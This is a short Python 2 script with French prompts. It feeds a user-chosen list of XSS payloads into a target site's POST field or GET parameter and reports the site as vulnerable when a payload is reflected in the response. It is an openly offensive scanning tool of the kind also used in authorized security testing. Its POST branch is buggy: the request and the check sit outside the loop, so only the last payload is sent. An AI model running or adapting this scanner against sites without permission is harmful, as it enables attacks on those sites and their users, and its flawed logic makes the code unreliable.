# coding: utf-8
import requests
laliste = raw_input("Liste de payloads (ex : xss.txt) : ")
file = open(laliste)
choice = raw_input("(POST/GET) XSS : ")
if choice == "POST" or choice == "post":
	website = raw_input("Lien XSS : ")
	laData = raw_input("Nom de l'input : ")
	for payload in file:
		data = {laData:payload}
	combined = requests.post(website, data = data)
	if payload in combined.text:
		print("La XSS fonctionne => "+website+" \nPOST data = "+str(data))
	else:
		print("La XSS ne fonctionne pas...")
if choice == "GET" or choice == "get":
	website = raw_input("Lien XSS ex : https://www.site.com/index.php?search= : ")
	for payload in file:
		combined = requests.get(website+payload)
		if payload in combined.text:
			print("La XSS fonctionne => " +website+payload)
			break
		else:
			print("La XSS fonctionne pas :(")
